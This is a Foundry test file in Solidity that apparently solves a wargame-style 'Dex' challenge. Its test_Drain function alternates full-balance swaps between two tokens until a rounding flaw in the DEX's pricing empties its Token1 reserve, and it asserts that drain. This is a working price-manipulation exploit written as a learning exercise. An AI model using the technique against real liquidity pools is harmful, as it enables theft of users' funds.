// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Dex, SwappableToken} from "../src/Dex.sol";

contract DexTest is Test {
    SwappableToken public swappabletoken1;
    SwappableToken public swappabletoken2;
    Dex public dex;
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.startPrank(attacker);
        dex = new Dex();
        swappabletoken1 = new SwappableToken(address(dex), "Swap", "SW", 110);
        vm.label(address(swappabletoken1), "Token 1");
        swappabletoken2 = new SwappableToken(address(dex), "Swap", "SW", 110);
        vm.label(address(swappabletoken2), "Token 2");
        dex.setTokens(address(swappabletoken1), address(swappabletoken2));

        dex.approve(address(dex), 100);
        dex.addLiquidity(address(swappabletoken1), 100);
        dex.addLiquidity(address(swappabletoken2), 100);

        vm.label(attacker, "Attacker");
        vm.stopPrank();
    }

    function test_Drain() public {
        vm.startPrank(attacker);
        for (uint256 i; i < 2; i++) {
            dex.approve(address(dex), swappabletoken1.balanceOf(attacker));
            dex.swap(
                address(swappabletoken1),
                address(swappabletoken2),
                swappabletoken1.balanceOf(attacker)
            );
            dex.approve(address(dex), swappabletoken2.balanceOf(attacker));
            dex.swap(
                address(swappabletoken2),
                address(swappabletoken1),
                swappabletoken2.balanceOf(attacker)
            );
        }

        dex.approve(address(dex), swappabletoken1.balanceOf(attacker));
        dex.swap(
            address(swappabletoken1),
            address(swappabletoken2),
            swappabletoken1.balanceOf(attacker)
        );
        dex.approve(address(dex), swappabletoken2.balanceOf(address(dex)));
        dex.swap(
            address(swappabletoken2),
            address(swappabletoken1),
            swappabletoken2.balanceOf(address(dex))
        );

        console.log(
            "Attacker Balance Token1:",
            swappabletoken1.balanceOf(attacker)
        );
        console.log(
            "Attacker Balance Token2:",
            swappabletoken2.balanceOf(attacker)
        );
        console.log(
            "Dex Balance Token1:",
            swappabletoken1.balanceOf(address(dex))
        );
        console.log(
            "Dex Balance Token2:",
            swappabletoken2.balanceOf(address(dex))
        );

        assert(swappabletoken1.balanceOf(address(dex)) == 0);
    }
}
